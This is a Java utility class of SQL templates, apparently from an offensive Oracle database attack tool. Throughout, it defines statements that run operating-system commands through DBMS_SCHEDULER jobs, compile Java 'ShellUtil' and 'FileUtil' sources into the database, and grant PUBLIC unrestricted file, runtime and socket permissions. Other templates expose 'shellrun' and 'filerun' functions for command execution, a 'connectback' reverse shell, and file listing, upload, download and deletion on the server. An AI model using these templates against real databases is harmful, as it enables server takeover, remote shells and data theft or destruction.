package Util;

public class OracleSqlUtil {
    public static String getVersionSql = "select banner from v$version";
    public static String checkSql = "select '%s' from dual";
    public static String isDBASql = "select userenv('ISDBA') from dual";
    public static String CREATE_JOBSql = "BEGIN DBMS_SCHEDULER.create_job(job_name=>'%s',job_type=>'EXECUTABLE',number_of_arguments=>%s,job_action =>'%s');END;";
    public static String SET_JOB_ARGUMENT_VALUESql = "BEGIN DBMS_SCHEDULER.set_job_argument_value('%s',%s,'%s');END;";
    public static String ENABLESql = "BEGIN DBMS_SCHEDULER.enable('%s');END;";
    public static String checkJobSql = "select job_name from dba_scheduler_jobs where job_name='%s'";
    public static String deleteJobSql = "begin DBMS_SCHEDULER.drop_job('\"%s\"', %s, %s);end;";
    public static String getJobStatusSql = "SELECT status, additional_info FROM USER_SCHEDULER_JOB_RUN_DETAILS WHERE " +
            "job_name = '%s'";
    public static String ShellUtilCREATE_SOURCESql = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"ShellUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
    public static String ShellUtilGRANT_JAVA_EXECSql = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
    public static String ShellUtilGRANT_JAVA_EXEC2Sql = "begin dbms_java.grant_permission('PUBLIC','SYS:java.lang.RuntimePermission', '*', '');end;";
    public static String ShellUtilGRANT_JAVA_EXEC3Sql = "begin dbms_java.grant_permission('PUBLIC','SYS:java.net.SocketPermission', '*', 'accept, connect, listen, resolve');end;";
    public static String ShellUtilCREATE_FUNCTIONSql = "begin execute immediate 'create or replace function shellrun(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name ''ShellUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String'';';end;";
    public static String FileUtilCREATE_SOURCESql = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"FileUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
    public static String FileUtilGRANT_JAVA_EXECSql = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
    public static String FileUtilGRANT_JAVA_EXEC1Sql = "begin dbms_java.grant_permission('PUBLIC', 'SYS:java.util.PropertyPermission', '*', 'read,write' );end;";
    public static String FileUtilCREATE_FUNCTIONSql = "create or replace function filerun(methodName varchar2,params varchar2,encoding" +
            " varchar2) return varchar2 as language java name 'FileUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
    public static String shellRunSql = "select shellrun('exec','%s','%s') from dual";
    public static String checkShellFunctionSql = "select object_name from all_objects where object_name like '%SHELLRUN'";
    public static String deleteShellJAVASOURCESql = "DROP JAVA SOURCE \"ShellUtil\"";
    public static String deleteShellFunctionSql = "drop function SHELLRUN";
    public static String checkFileFunctionSql = "select object_name from all_objects where object_name like '%FILERUN'";
    public static String deleteFileJAVASOURCESql = "DROP JAVA SOURCE \"FileUtil\"";
    public static String deleteFileFunctionSql = "drop function FILERUN";
    public static String checkReverseJavaShellSql = "select object_name from all_objects where object_name like '%SHELLRUN%' ";
    public static String reverseJavaShellSql = "select shellrun('connectback','%s^%s','') from dual";
    public static String getDiskSql = "select filerun('listdiver','','') from dual";
    public static String getFilesSql = "select filerun('listfile','%s','%s') from dual";
    public static String uploadSql = "select filerun('writefile','%s^%s','') from dual";
    public static String downloadSql = "select filerun('readfile','%s','') from dual";
    public static String deleteSql = "select filerun('deletefile','%s','') from dual";


}
